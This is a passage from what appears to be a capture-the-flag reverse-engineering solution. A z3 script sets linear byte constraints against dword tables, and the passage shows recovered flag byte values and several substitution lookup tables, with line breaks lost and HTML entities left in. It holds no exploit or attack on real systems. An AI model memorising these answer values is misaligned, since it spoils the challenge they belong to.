* a1[8] \\ + 13 * a1[5] \\ + 206 * a1[3] \\ + 234 * a1[15] \\ + 71 * a1[7] \\ + 239 * a1[12] \\ + 141 * a1[10] \\ + 179 * a1[13] \\ + 113 * a1[14] \\ + 181 * a1[9] \\ + 52 * a1[6] \\ + 74 * a1[11] \\ + 168 * a1[4] \\ + 239 * a1[1] \\ + 164 * a1[0] \\ + 179 * a1[2])&amp;0xffffffff)s.add(dword_422040[14] == (211 * a1[1] \\ + 74 * a1[5] \\ + 144 * a1[8] \\ + 234 * a1[0] \\ + 241 * a1[2] \\ + 157 * a1[11] \\ + 25 * a1[15] \\ + 6 * a1[10] \\ + 243 * a1[6] \\ + 107 * a1[9] \\ + 77 * a1[12] \\ + 127 * a1[4] \\ + 67 * a1[7] \\ + 13 * a1[14] \\ + 151 * a1[3] \\ + 127 * a1[13])&amp;0xffffffff)s.add(dword_422040[2] == (209 * a1[9] \\ + 110 * a1[7] \\ + 22 * a1[10] \\ + 102 * a1[11] \\ + 187 * a1[1] \\ + 58 * a1[8] \\ + 236 * a1[6] \\ + 146 * a1[13] \\ + 205 * a1[15] \\ + 63 * a1[2] \\ + 211 * a1[4] \\ + 152 * a1[3] \\ + 82 * a1[14] \\ + 14 * a1[5] \\ + 49 * a1[12] \\ + 251 * a1[0])&amp;0xffffffff)s.add(dword_422040[12] == (230 * a1[0] \\ + 27 * a1[3] \\ + 186 * a1[10] \\ + 58 * a1[7] \\ + 121 * a1[1] \\ + 59 * a1[14] \\ + 90 * a1[12] \\ + 40 * a1[2] \\ + 230 * a1[11] \\ + 25 * a1[6] \\ + 198 * a1[5] \\ + 81 * a1[4] \\ + 71 * a1[13] \\ + 180 * a1[8] \\ + 149 * a1[9] \\ + 73 * a1[15])&amp;0xffffffff)s.add(dword_422040[4] == (188 * a1[5] \\ + 80 * a1[1] \\ + 221 * a1[6] \\ + ((a1[12] &lt;&lt; 6)&amp;0xffffffff) \\ + 230 * a1[3] \\ + 123 * a1[8] \\ + 124 * a1[11] \\ + 253 * a1[0] \\ + 202 * a1[10] \\ + 63 * a1[2] \\ + 40 * a1[7] \\ + 109 * a1[9] \\ + 195 * a1[15] \\ + 199 * a1[13] \\ + 82 * a1[4] \\ + 225 * a1[14])&amp;0xffffffff)s.add(dword_422040[1] == (236 * a1[15] \\ + 44 * a1[14] \\ + 214 * a1[13] \\ + 52 * a1[8] \\ + 37 * a1[6] \\ + 101 * a1[9] \\ + 244 * a1[10] \\ + 238 * a1[11] \\ + 109 * a1[0] \\ + 188 * a1[1] \\ + 20 * a1[3] \\ + 87 * a1[7] \\ + 93 * a1[4] \\ + 158 * a1[5] \\ + 105 * a1[12] \\ + 3 * a1[2])&amp;0xffffffff)assert s.check() == satprint(s.model())flag[28] = 114flag[18] = 42flag[21] = 71flag[27] = 42flag[30] = 124flag[32] = 51flag[23] = 42flag[26] = 186flag[31] = 209flag[17] = 186flag[24] = 186flag[29] = 11flag[20] = 45flag[19] = 51flag[22] = 51flag[25] = 25dword_422000 = [0x0002A81A, 0x00028D44, 0x00022653, 0x0002E993, 0x000249B5, 0x00024265, 0x0003253D, 0x0002D77B, 0x000282C8, 0x00022892, 0x0002BD54, 0x0002482E, 0x00024C1F, 0x00028127, 0x0001E62E, 0x0001F009]x = Solver()a1 = [BitVec(f&#x27;flag[&#123;i&#125;]&#x27;,8) for i in range(1,17)]x.add(dword_422000[12] == (199 * a1[9] \\ + 98 * a1[7] \\ + 192 * a1[8] \\ + 23 * a1[12] \\ + 79 * a1[14] \\ + 77 * a1[10] \\ + 185 * a1[13] \\ + 135 * a1[15] \\ + 119 * a1[4] \\ + 54 * a1[0] \\ + 41 * a1[1] \\ + 124 * a1[6] \\ + 18 * a1[2] \\ + 181 * a1[11] \\ + 191 * a1[5] \\ + 7 * a1[3])&amp;0xffffffff)x.add(dword_422000[3] == (210 * a1[11] \\ + 26 * a1[15] \\ + 169 * a1[0] \\ + 177 * a1[13] \\ + a1[6] \\ + 205 * a1[8] \\ + 223 * a1[10] \\ + 32 * a1[5] \\ + 225 * a1[3] \\ + 61 * a1[14] \\ + 72 * a1[1] \\ + 186 * a1[9] \\ + 253 * a1[12] \\ + 205 * a1[2] \\ + 49 * a1[4] \\ + 232 * a1[7])&amp;0xffffffff)x.add(dword_422000[13] == (192 * a1[3] \\ + 22 * a1[10] \\ + 175 * a1[1] \\ + 184 * a1[7] \\ + 116 * a1[15] \\ + 70 * a1[13] \\ + 153 * a1[14] \\ + 119 * a1[0] \\ + 217 * a1[6] \\ + 123 * a1[5] \\ + 17 * a1[2] \\ + 244 * a1[12] \\ + 116 * a1[8] \\ + 46 * a1[4] \\ + 19 * a1[9] \\ + 130 * a1[11])&amp;0xffffffff)x.add(dword_422000[7] == (41 * a1[12] \\ + 71 * a1[7] \\ + 185 * a1[1] \\ + 69 * a1[11] \\ + 142 * a1[8] \\ + 221 * a1[5] \\ + 24 * a1[3] \\ + 208 * a1[6] \\ + 41 * a1[9] \\ + 159 * a1[2] \\ + 231 * a1[14] \\ + 235 * a1[13] \\ + 225 * a1[0] \\ + (a1[4] &lt;&lt; 6) \\ + 162 * a1[10] \\ + 134 * a1[15])&amp;0xffffffff)x.add(dword_422000[11] == (36 * a1[12] \\ + 220 * a1[4] \\ + 110 * a1[13] \\ + 45 * a1[7] \\ + 123 * a1[9] \\ + 133 * a1[1] \\ + 101 * a1[5] \\ + 137 * a1[10] \\ + 102 * a1[0] \\ + 227 * a1[14] \\ + 94 * a1[15] \\ + 18 * a1[2] \\ + 22 * a1[6] \\ + 189 * a1[11] \\ + 218 * a1[8])&amp;0xffffffff)x.add(dword_422000[15] == (86 * a1[11] \\ + 31 * a1[9] \\ + 229 * a1[6] \\ + 27 * a1[3] \\ + 6 * a1[12] \\ + 13 * a1[10] \\ + 158 * a1[1] \\ + 89 * a1[7] \\ + 35 * a1[15] \\ + 126 * a1[8] \\ + 165 * a1[13] \\ + 220 * a1[0] \\ + 138 * a1[5] \\ + 100 * a1[4] \\ + 84 * a1[14] \\ + 175 * a1[2])&amp;0xffffffff)x.add(dword_422000[8] == (7 * a1[1] \\ + 28 * a1[8] \\ + 131 * a1[10] \\ + 6 * a1[6] \\ + 254 * a1[0] \\ + 130 * a1[13] \\ + 124 * a1[3] \\ + 55 * a1[12] \\ + 157 * a1[14] \\ + 175 * a1[5] \\ + 140 * a1[4] \\ + 241 * a1[9] \\ + 11 * a1[11] \\ + 211 * a1[2] \\ + 121 * a1[7] \\ + 200 * a1[15])&amp;0xffffffff)x.add(dword_422000[6] == (195 * a1[14] \\ + 197 * a1[13] \\ + 218 * a1[7] \\ + 83 * a1[1] \\ + 98 * a1[2] \\ + 70 * a1[10] \\ + 229 * a1[15] \\ + 148 * a1[11] \\ + 195 * a1[0] \\ + 94 * a1[6] \\ + 211 * a1[12] \\ + 220 * a1[9] \\ + 81 * a1[5] \\ + 253 * a1[8] \\ + 78 * a1[4] \\ + 4 * a1[3])&amp;0xffffffff)x.add(dword_422000[14] == (3 * a1[4] \\ + 136 * a1[7] \\ + 156 * a1[3] \\ + 189 * a1[1] \\ + 244 * a1[12] \\ + 157 * a1[15] \\ + 83 * a1[9] \\ + 6 * a1[0] \\ + 113 * a1[6] \\ + 63 * a1[14] \\ + 35 * a1[2] \\ + 22 * a1[8] \\ + 26 * a1[10] \\ + 62 * a1[11] \\ + 98 * a1[5] \\ + 110 * a1[13])&amp;0xffffffff)x.add(dword_422000[4] == (96 * a1[4] \\ + 248 * a1[8] \\ + 191 * a1[9] \\ + 194 * a1[2] \\ + 154 * a1[1] \\ + 31 * a1[6] \\ + 157 * a1[7] \\ + 248 * a1[13] \\ + 81 * a1[15] \\ + 56 * a1[10] \\ + 52 * a1[0] \\ + 94 * a1[12] \\ + 212 * a1[5] \\ + 83 * a1[3] \\ + 83 * a1[14] \\ + 158 * a1[11])&amp;0xffffffff)x.add(dword_422000[1] == (67 * a1[4] \\ + 220 * a1[2] \\ + 123 * a1[11] \\ + 168 * a1[5] \\ + 23 * a1[12] \\ + 148 * a1[7] \\ + 127 * a1[10] \\ + 194 * a1[1] \\ + 132 * a1[8] \\ + 44 * a1[0] \\ + 60 * a1[13] \\ + 98 * a1[15] \\ + 38 * a1[14] \\ + 245 * a1[9] \\ + 159 * a1[6] \\ + 146 * a1[3])&amp;0xffffffff)x.add(dword_422000[5] == (132 * a1[3] \\ + 10 * a1[7] \\ + 95 * a1[0] \\ + 83 * a1[10] \\ + 99 * a1[1] \\ + 77 * a1[12] \\ + 195 * a1[2] \\ + 47 * a1[6] \\ + 38 * a1[13] \\ + 178 * a1[8] \\ + 74 * a1[4] \\ + 86 * a1[11] \\ + 208 * a1[9] \\ + 240 * a1[14] \\ + 120 * a1[5] \\ + 43 * a1[15])&amp;0xffffffff)x.add(dword_422000[9] == (172 * a1[1] \\ + 110 * a1[2] \\ + 92 * a1[7] \\ + 126 * a1[15] \\ + 91 * a1[0] \\ + 77 * a1[6] \\ + 207 * a1[5] \\ + 249 * a1[11] \\ + 240 * a1[12] \\ + 129 * a1[10] \\ + 6 * a1[13] \\ + 100 * a1[3] \\ + a1[14] \\ + 76 * a1[9] \\ + 127 * a1[4] \\ + 4 * a1[8])&amp;0xffffffff)x.add(dword_422000[10] == (46 * a1[15] \\ + 37 * a1[0] \\ + 3 * a1[3] \\ + 72 * a1[6] \\ + 116 * a1[7] \\ + 186 * a1[1] \\ + 221 * a1[14] \\ + 236 * a1[4] \\ + 79 * a1[2] \\ + 175 * a1[10] \\ + 184 * a1[9] \\ + 160 * a1[11] \\ + 227 * a1[12] \\ + 99 * a1[8] \\ + 71 * a1[13] \\ + 4 * a1[5])&amp;0xffffffff)x.add(dword_422000[0] == (203 * a1[3] \\ + 31 * a1[0] \\ + 11 * a1[14] \\ + 149 * a1[7] \\ + 215 * a1[5] \\ + 206 * a1[1] \\ + 245 * a1[6] \\ + 9 * a1[11] \\ + 16 * a1[10] \\ + 241 * a1[13] \\ + 110 * a1[8] \\ + 175 * a1[2] \\ + 38 * a1[4] \\ + 227 * a1[9] \\ + 208 * a1[12] \\ + 8 * a1[15])&amp;0xffffffff)x.add(dword_422000[2] == (132 * a1[3] \\ + 119 * a1[14] \\ + 26 * a1[8] \\ + 24 * a1[6] \\ + 121 * a1[11] \\ + 235 * a1[2] \\ + 228 * a1[12] \\ + 34 * a1[5] \\ + 37 * a1[15] \\ + 24 * a1[9] \\ + 145 * a1[13] \\ + 199 * a1[4] \\ + 173 * a1[10] \\ + 58 * a1[0] \\ + 246 * a1[7] \\ + 199 * a1[1])&amp;0xffffffff) assert x.check() == satprint(x.model())flag[0] = 0x23flag[33] = 0x21flag[5] = 43flag[11] = 186flag[8] = 51flag[16] = 72flag[6] = 42flag[4] = 51flag[3] = 1flag[10] = 179flag[14] = 43flag[7] = 186flag[1] = 90flag[13] = 113flag[12] = 51flag[2] = 45flag[9] = 72flag[15] = 114by280 = [0x7A, 0x91, 0x9F, 0x23, 0x71, 0xD1, 0x63, 0xDB, 0x59, 0x0A, 0xEC, 0x69, 0xEE, 0x76, 0x5D, 0x64, 0x37, 0x42, 0x8C, 0x0B, 0x3C, 0x5C, 0x80, 0xAD, 0x6A, 0x03, 0x43, 0x93, 0xBC, 0xBF, 0xE3, 0xAF, 0x5A, 0x8A, 0x65, 0x0D, 0x31, 0xDF, 0x3E, 0xA7, 0xE4, 0xDD, 0xB4, 0xB0, 0x56, 0x1C, 0x12, 0xA4, 0x9E, 0xD8, 0x3D, 0x81, 0x60, 0x9A, 0xCB, 0xFA, 0xB1, 0xE0, 0xD3, 0xF4, 0xA2, 0x26, 0x68, 0x90, 0x4B, 0x45, 0x85, 0x20, 0x16, 0xDE, 0xED, 0x4C, 0x6F, 0x34, 0xDC, 0xBE, 0xD2, 0x46, 0x33, 0x14, 0x77, 0xC6, 0xCD, 0xF0, 0xC5, 0xAC, 0x1F, 0xD0, 0x95, 0x97, 0x3F, 0xD7, 0x52, 0xAE, 0xB9, 0xC9, 0x0C, 0xCA, 0x4E, 0xF1, 0xB7, 0x39, 0x7F, 0x27, 0x2B, 0x40, 0x4A, 0x51, 0xA1, 0xCC, 0xCE, 0x6E, 0x70, 0xFF, 0x0E, 0xEF, 0x8E, 0x25, 0xB3, 0x5E, 0x6C, 0xAB, 0x02, 0x49, 0xE9, 0x9B, 0x36, 0x13, 0x9C, 0x04, 0x35, 0xC0, 0xFB, 0x3A, 0x67, 0xB6, 0x9D, 0xC2, 0x73, 0xB5, 0x6D, 0xCF, 0x83, 0x2C, 0x01, 0xC1, 0x10, 0x6B, 0x79, 0x87, 0x5B, 0x57, 0x47, 0xE5, 0x15, 0xF7, 0xA5, 0x74, 0xAA, 0x53, 0x7D, 0x2E, 0xD5, 0xA3, 0x19, 0xF5, 0x2D, 0xFD, 0x61, 0x8D, 0xC8, 0x1B, 0xC3, 0xDA, 0xF6, 0x72, 0x54, 0x5F, 0x1E, 0xE8, 0x17, 0x50, 0xB2, 0xE7, 0x0F, 0x7E, 0x55, 0xBD, 0x86, 0x00, 0x78, 0x94, 0x92, 0x09, 0x2F, 0xD6, 0xD9, 0xF3, 0x29, 0xE6, 0x24, 0x32, 0x66, 0x22, 0x41, 0xC4, 0x7C, 0x05, 0x98, 0x44, 0x4F, 0x99, 0xA9, 0xE1, 0x8F, 0x08, 0x1A, 0x2A, 0x11, 0xEA, 0x3B, 0xE2, 0x38, 0xB8, 0x18, 0xF9, 0xD4, 0xC7, 0x62, 0x7B, 0x75, 0x58, 0x96, 0x28, 0xEB, 0x06, 0x84, 0x89, 0x48, 0x82, 0x88, 0xA6, 0xFE, 0xA0, 0xF2, 0xF8, 0x1D, 0x8B, 0xFC, 0xA8, 0x21, 0x30, 0xBB, 0x07, 0xBA, 0x4D]by380 = [0x45, 0x1F, 0x63, 0x81, 0xE6, 0xAD, 0x4F, 0xD3, 0xC0, 0x15, 0x69, 0x8F, 0x0D, 0x31, 0x0C, 0xB0, 0xF1, 0x2E, 0x98, 0xC1, 0xC2, 0x96, 0xB2, 0xEB, 0xBF, 0xDF, 0x17, 0xF4, 0x7F, 0xE5, 0x66, 0x73, 0xD8, 0x56, 0x46, 0x20, 0x9C, 0x77, 0x3D, 0x72, 0xA3, 0x91, 0x49, 0x68, 0x4C, 0x1E, 0xAE, 0x06, 0x7A, 0x94, 0xDD, 0x52, 0x55, 0x2C, 0xB8, 0x42, 0x79, 0xFE, 0x38, 0xEF, 0x8B, 0xF7, 0xAC, 0xDC, 0xFF, 0x78, 0x34, 0x70, 0xA9, 0xCE, 0x3F, 0x0E, 0x11, 0x43, 0x5B, 0xF8, 0xAF, 0xD0, 0xFA, 0x33, 0xBA, 0xCF, 0x4A, 0xC9, 0x88, 0x4E, 0x80, 0x10, 0x85, 0x37, 0x12, 0xAB, 0xE1, 0x61, 0xB7, 0x3E, 0x4D, 0x19, 0x3A, 0x04, 0x8C, 0x92, 0x0B, 0xE7, 0x3C, 0xEA, 0xC7, 0x16, 0x35, 0xB1, 0xA7, 0x8E, 0x40, 0x9F, 0xB6, 0xB5, 0x25, 0xA0, 0x5A, 0x30, 0x7D, 0xA2, 0x1A, 0x64, 0xC5, 0x6D, 0x74, 0x82, 0x08, 0x7E, 0xD2, 0xF6, 0xAA, 0xDA, 0xED, 0x4B, 0x6E, 0xE8, 0xE9, 0xE2, 0xD4, 0x71, 0xB9, 0x09, 0x84, 0x3B, 0xC4, 0x1C, 0x60, 0xFD, 0x22, 0x99, 0x39, 0x97, 0x18, 0x89, 0x7C, 0xA4, 0x27, 0xBD, 0x0F, 0xCC, 0x95, 0xF5, 0xB3, 0x65, 0x6B, 0x8A, 0x58, 0x36, 0xBB, 0x9E, 0x75, 0xD1, 0x03, 0x9D, 0x6A, 0x6C, 0x53, 0x05, 0xB4, 0xE4, 0xEE, 0x67, 0x87, 0x7B, 0x32, 0x2D, 0x24, 0x2A, 0x59, 0xEC, 0x0A, 0xDB, 0x21, 0x07, 0x23, 0x50, 0x02, 0x41, 0xF2, 0x83, 0xD9, 0x26, 0xBC, 0x6F, 0x86, 0xA6, 0x93, 0xF9, 0xC8, 0xD6, 0xA5, 0x1D, 0xE3, 0xE0, 0xFC, 0xCA, 0x1B, 0x5E, 0x8D, 0x2F, 0x5C, 0xBE, 0x47, 0xA8, 0x44, 0x57, 0x54, 0x48, 0xC3, 0x00, 0x62, 0x5D, 0xCB, 0xD7, 0x76, 0xCD, 0x28, 0xD5, 0x14, 0x90, 0x13, 0xDE, 0x5F, 0xF0, 0x01, 0x2B, 0xC6, 0x29, 0x9A, 0x9B, 0x51, 0xF3, 0xFB, 0xA1]by580 = [0x00, 0x74, 0x59, 0xC6, 0xAC, 0xD3, 0xC1, 0xA0, 0x88, 0x3F, 0x1C, 0x28, 0x17, 0x22, 0xC5, 0x38, 0xF9, 0x1B, 0x21, 0x49, 0x99, 0xAF, 0xD6, 0x95, 0xA4, 0x9D, 0x5D, 0x5B, 0x73, 0xFE, 0xC9, 0x9A, 0x4C, 0xB4, 0x27, 0x5E, 0x71, 0x25, 0xE2, 0x90, 0xC0, 0x62, 0x5F, 0x48, 0x77, 0xE0, 0xF2, 0x8E, 0x40, 0xC7, 0x79, 0x1A, 0xDC, 0xF3, 0x01, 0xB6, 0xD8, 0xB5, 0x67, 0x1E, 0x85, 0x12, 0x68, 0x87, 0xD0, 0x30, 0xEB, 0x2F, 0x50, 0xCF, 0xEE, 0xDD, 0xFB, 0xE6, 0xA5, 0x69, 0x05, 0x75, 0xB7, 0xEF, 0x70, 0x53, 0xFF, 0xBA, 0x80, 0x41, 0x9B, 0xA1, 0x39, 0xF8, 0x65, 0x1F, 0x7A, 0x51, 0x98, 0xAD, 0x02, 0x13, 0x18, 0xC3, 0x31, 0x89, 0xCD, 0xCA, 0x91, 0xD1, 0x78, 0x57, 0x47, 0xB8, 0x54, 0x9F, 0x96, 0x04, 0x23, 0x2B, 0xE5, 0x46, 0x29, 0x7C, 0x76, 0x82, 0xBC, 0xFC, 0x6E, 0xEC, 0xED, 0x64, 0x4A, 0x26, 0x34, 0x5C, 0x19, 0x55, 0xFD, 0x6D, 0xFA, 0x7E, 0xB2, 0xD4, 0xF1, 0xF6, 0xE4, 0x60, 0xB0, 0x52, 0x9E, 0x8F, 0xBB, 0x08, 0x3B, 0x97, 0xE8, 0x10, 0x6C, 0x44, 0x3A, 0x36, 0x35, 0x03, 0xC4, 0x81, 0x9C, 0xAB, 0xCB, 0x66, 0xAA, 0x37, 0xA2, 0xD2, 0xE1, 0xE9, 0x7B, 0x14, 0x8D, 0xD9, 0xF5, 0x0B, 0xC2, 0x07, 0xA8, 0x0D, 0xA3, 0x0A, 0x84, 0x6B, 0x2C, 0xEA, 0x0C, 0xAE, 0x7D, 0x6F, 0xD7, 0xE7, 0xC8, 0x3C, 0x45, 0xCC, 0x58, 0xB9, 0x3D, 0x33, 0x4E, 0x4B, 0x8C, 0xCE, 0x72, 0x6A, 0x8B, 0x2D, 0x24, 0x11, 0xDF, 0x5A, 0x2E, 0x92, 0xDA, 0x86, 0x94, 0xA7, 0xD5, 0x4F, 0x2A, 0xB3, 0x63, 0x61, 0xE3, 0xDE, 0x43, 0x1D, 0xBF, 0x15, 0x32, 0xBE, 0x16, 0x3E, 0x93, 0x7F, 0x83, 0x56, 0x06, 0xF7, 0x8A, 0x20, 0xBD, 0x0E, 0xA6, 0xDB, 0x0F, 0xB1, 0x42, 0xF0, 0x09, 0x4D, 0xA9, 0xF4]by780 = [0x0F, 0xA5, 0xBA, 0x03, 0xF9, 0x69, 0x2A, 0xD7, 0xEA, 0xB5, 0xFC, 0xA1, 0x39, 0x20, 0x68, 0x72, 0x25, 0xB2, 0x6C, 0xAD, 0x88, 0x51, 0x73, 0xEB, 0xCF, 0x13, 0xDE, 0x7C, 0x6D, 0x38, 0x05, 0x09, 0xC2, 0x96, 0x1F, 0x7F, 0x37, 0x4A, 0xC9, 0xE7, 0x6A, 0xB0, 0x59, 0xF7, 0xD2, 0xB9, 0x16, 0xC8, 0xEE, 0xA9, 0x18, 0x80, 0xAC, 0xE3, 0x9E, 0x6F, 0x3C, 0x2F, 0x3E, 0x9A, 0xBE, 0x1D, 0xB4, 0x7B, 0x7D, 0x32, 0x6B, 0x74, 0xC5, 0xC0, 0xC7, 0xD1, 0x29, 0x98, 0xDD, 0xB6, 0x0E, 0x4D, 0xBF, 0x79, 0x0D, 0xDA, 0x7A, 0x17, 0x71, 0x43, 0x87, 0xFF, 0xDC, 0xC6, 0x12, 0xE9, 0x67, 0x2D, 0x70, 0x9F, 0x95, 0x30, 0x26, 0x24, 0x2B, 0xA8, 0xA2, 0xD8, 0x3B, 0x31, 0xA0, 0x3D, 0x4B, 0x90, 0x60, 0x34, 0x75, 0xE8, 0x5D, 0xF4, 0x85, 0xF3, 0xFE, 0x35, 0xCB, 0xB8, 0x02, 0x50, 0xB1, 0xF1, 0x1A, 0x1B, 0x21, 0xCD, 0xC4, 0x7E, 0xED, 0x07, 0xD9, 0xD6, 0x44, 0x15, 0x8E, 0x49, 0xB3, 0x97, 0xE6, 0x63, 0xB7, 0xEF, 0x3A, 0x8F, 0xF2, 0x53, 0x10, 0x77, 0x86, 0xF8, 0x8A, 0x28, 0x3F, 0xD4, 0x4C, 0xE5, 0x82, 0x83, 0xEC, 0x62, 0x89, 0xDF, 0xC3, 0x14, 0xCA, 0xA3, 0x5F, 0x64, 0x47, 0xFD, 0x00, 0x84, 0x66, 0xA7, 0x5A, 0x0C, 0x01, 0xD5, 0x5B, 0x0A, 0x4F, 0x27, 0x78, 0x0B, 0x2E, 0x48, 0x36, 0xFA, 0x08, 0x56, 0xE0, 0xA6, 0xC1, 0x5C, 0x8B, 0x41, 0x06, 0xBB, 0x52, 0x93, 0xAF, 0x2C, 0x5E, 0xF6, 0x61, 0xF0, 0xAB, 0x91, 0x45, 0x04, 0xBD, 0xCC, 0xE4, 0x65, 0x9D, 0x92, 0xCE, 0x40, 0xAE, 0x76, 0x9B, 0x9C, 0xAA, 0x54, 0xD0, 0x1C, 0x81, 0x4E, 0x57, 0x55, 0x23, 0x6E, 0x1E, 0x99, 0xDB, 0xFB, 0xA4, 0x22, 0x19, 0x58, 0x11, 0x8D, 0x94, 0xD3, 0xE2, 0x8C, 0xF5, 0x42, 0x46, 0xBC, 0x33, 0xE1]byb80 = [0x38, 0xD9, 0xDA, 0xE6, 0xB5, 0xF1, 0x0B, 0x93, 0x0C, 0x58, 0x0D, 0xAE, 0x0A, 0x85, 0x2A, 0x50, 0xC2, 0xBF, 0xD4, 0x28, 0x52, 0xC4, 0x4F, 0xE1, 0x44, 0xE0, 0xA2, 0x70, 0x36, 0x65, 0x4B, 0x41, 0x9D, 0x5F, 0x05, 0x7C, 0xF7, 0xD7, 0x99, 0x8B, 0xCC, 0xCE, 0x16, 0xBE, 0xB6, 0xC5, 0x8F, 0x79, 0xC7, 0x20, 0x7E, 0xF4, 0xF3, 0x2E, 0x4A, 0x89, 0xD6, 0x0F, 0x6E, 0xB0, 0x61, 0xB1, 0x6D, 0x19, 0x73, 0x03, 0x74, 0xA1, 0x40, 0xEC, 0xC0, 0x57, 0x94, 0x7A, 0x66, 0xD5, 0xEA, 0x17, 0x6A, 0x84, 0x37, 0xED, 0xF6, 0x13, 0x31, 0x5B, 0x82, 0x1E, 0xFC, 0x92, 0xE2, 0x42, 0x86, 0xBA, 0xE3, 0x91, 0x7F, 0x67, 0x5C, 0x98, 0x15, 0x22, 0x8D, 0x80, 0x04, 0xE4, 0x25, 0x09, 0xA0, 0xAD, 0x63, 0xE5, 0xB4, 0x9A, 0x3C, 0xA3, 0x3A, 0x69, 0xF8, 0xCD, 0xBC, 0x88, 0x55, 0xB2, 0xBD, 0x6B, 0x77, 0x71, 0xB3, 0xD3, 0x90, 0x75, 0x06, 0x49, 0xC3, 0x32, 0x4D, 0x1D, 0xA8, 0xAA, 0xFB, 0x7B, 0x7D, 0x2B, 0xA6, 0x34, 0x72, 0x47, 0xF0, 0x2F, 0x9C, 0x08, 0x00, 0x14, 0x8C, 0x26, 0x5E, 0x87, 0xD1, 0xCF, 0xC9, 0x18, 0x51, 0x23, 0xCB, 0xF5, 0x1C, 0x9F, 0x97, 0xF9, 0xBB, 0xA7, 0x39, 0x45, 0x02, 0xFD, 0x46, 0x8A, 0x54, 0xA4, 0x8E, 0x9E, 0x68, 0x96, 0x0E, 0x78, 0xB8, 0x3D, 0x11, 0x64, 0xAF, 0x10, 0xDE, 0x6C, 0x60, 0x5A, 0x76, 0x1A, 0xE9, 0xC1, 0x3E, 0xCA, 0x9B, 0x27, 0x30, 0xEF, 0xFF, 0x07, 0xD2, 0xB9, 0x2D, 0xD0, 0xEE, 0x83, 0xAB, 0xF2, 0x4C, 0xA5, 0x21, 0x62, 0x81, 0x33, 0x1B, 0xD8, 0x6F, 0xAC, 0x3B, 0x5D, 0xE8, 0xFA, 0x3F, 0xDB, 0x95, 0xE7, 0x59, 0x12, 0x48, 0x35, 0xC6, 0x2C, 0x4E, 0x01, 0xDD, 0x43, 0x29, 0xDC, 0x24, 0x1F, 0xB7, 0xA9, 0xEB, 0xC8, 0xFE, 0x56, 0xDF, 0x53]byd80 = [0xB0, 0x28, 0x0B, 0x89, 0x4B, 0xA4, 0xBE, 0x1A, 0x8F, 0x6C, 0xCF, 0xB2, 0xB5, 0xFE, 0xFB, 0x59, 0x2D, 0x29, 0x39, 0x62, 0x97, 0xAA, 0xD7, 0x7D, 0x94, 0x2C, 0xFC, 0x5D, 0xB4, 0x7C, 0x8A, 0x82, 0xD3, 0xA7, 0xBA, 0xDF, 0x21, 0xE6, 0xA2, 0xD0, 0xE8, 0xF0, 0x67, 0x3A, 0xB9, 0x98, 0xF9, 0xAE, 0xD1, 0x56, 0xD8, 0xCA, 0x10, 0xEA, 0x92, 0xA8, 0x75, 0x7E, 0x65, 0xA9, 0xAF, 0x51, 0xC9, 0x8E, 0xD4, 0x77, 0xE4, 0x49, 0x06, 0x61, 0x9E, 0x24, 0xD9, 0x9B, 0x11, 0x05, 0x1D, 0x96, 0x9A, 0xB1, 0xE0, 0x83, 0xE1, 0x1C, 0xCD, 0xF3, 0x38, 0xB3, 0x57, 0x50, 0xF4, 0xAC, 0xEB, 0x14, 0xA5, 0x46, 0xF6, 0x93, 0xAD, 0x7B, 0x30, 0xEF, 0x79, 0x17, 0x47, 0xDA, 0xC0, 0xDD, 0xDE, 0xDC, 0x5A, 0x76, 0x3B, 0x31, 0x0D, 0x0E, 0x86, 0xF1, 0x71, 0xFA, 0x0C, 0x00, 0xA3, 0xBF, 0x64, 0x37, 0x22, 0xD2, 0x69, 0x5C, 0xC6, 0x16, 0x9F, 0x5E, 0x7A, 0x1E, 0x27, 0x60, 0x6E, 0xF8, 0x8C, 0xEE, 0xC2, 0x74, 0x81, 0x8B, 0x33, 0x03, 0xBD, 0x2A, 0x0A, 0x68, 0x6B, 0x3F, 0x4C, 0xC3, 0x15, 0x04, 0x3D, 0x63, 0xF5, 0xAB, 0xCC, 0x3C, 0x53, 0x20, 0x66, 0xC4, 0xC1, 0x23, 0xE7, 0x25, 0x55, 0xC7, 0xED, 0xB7, 0xBC, 0xCB, 0x8D, 0x09, 0xCE, 0x52, 0xBB, 0xE2, 0xC5, 0xB6, 0x26, 0x12, 0x2F, 0x99, 0x58, 0x40, 0x6D, 0xA1, 0x3E, 0x48, 0x85, 0xA6, 0xF2, 0x0F, 0x43, 0x78, 0xB8, 0x01, 0xE5, 0xD5, 0x6F, 0x4E, 0xF7, 0x13, 0x42, 0xEC, 0x45, 0x2B, 0x4F, 0x36, 0xDB, 0x9C, 0xE3, 0x44, 0x34, 0x84, 0x73, 0x2E, 0x7F, 0xFD, 0x91, 0x41, 0xD6, 0x95, 0x18, 0xFF, 0x70, 0xC8, 0x02, 0x5F, 0x08, 0x1B, 0x6A, 0x5B, 0x19, 0xA0, 0x4D, 0x35, 0x54, 0xE9, 0x32, 0x88, 0x72, 0x07, 0x87, 0x90, 0x4A, 0x80, 0x1F, 0x9D]by1180 = [0xE8, 0x22, 0x64, 0x9F, 0xC5, 0xD5, 0x25, 0xC9, 0x5D, 0xDF, 0xA1, 0x74, 0xCB, 0x57, 0xF7, 0xF0, 0xBD, 0x56, 0xFF, 0x33, 0x79, 0xFE, 0x87, 0xB6, 0xB1, 0x54, 0x10, 0x95, 0x8A, 0xEC, 0x7B, 0x48, 0x84, 0x3D, 0x30, 0xEF, 0x86, 0xFA, 0x97, 0x1C, 0xDC, 0xA9, 0x5A, 0xF3, 0x67, 0x18, 0x83, 0x72, 0x06, 0xB9, 0xF5, 0x05, 0x68, 0x59, 0xF2, 0xE4, 0x88, 0x5E, 0x14, 0x17, 0x11, 0x9C, 0xAB, 0xDE, 0xEB, 0x7D, 0x62, 0x9B, 0xD6, 0xF4, 0x01, 0x29, 0xBC, 0xC0, 0x69, 0xA2, 0x2B, 0x0D, 0x1D, 0x98, 0x6A, 0xBE, 0x65, 0x09, 0xF8, 0x96, 0xB4, 0x6E, 0x63, 0xE3, 0x34, 0x2D, 0xCE, 0x0A, 0xCD, 0xAA, 0x21, 0xCC, 0xE7, 0xA5, 0xDB, 0xD8, 0x03, 0xDD, 0xB2, 0x1F, 0x9D, 0x9E, 0x0E, 0x8F, 0x8B, 0xCA, 0x92, 0x0B, 0xA7, 0x5B, 0xD2, 0xCF, 0x47, 0x07, 0x04, 0xAE, 0x3B, 0xA8, 0x7C, 0x73, 0xF9, 0x35, 0xEE, 0x7A, 0xB0, 0xBA, 0x85, 0x46, 0x3E, 0x81, 0xC7, 0x40, 0x37, 0x15, 0x3A, 0x19, 0xE0, 0x1E, 0x28, 0x4A, 0x4F, 0x8C, 0xD4, 0x51, 0x2E, 0x94, 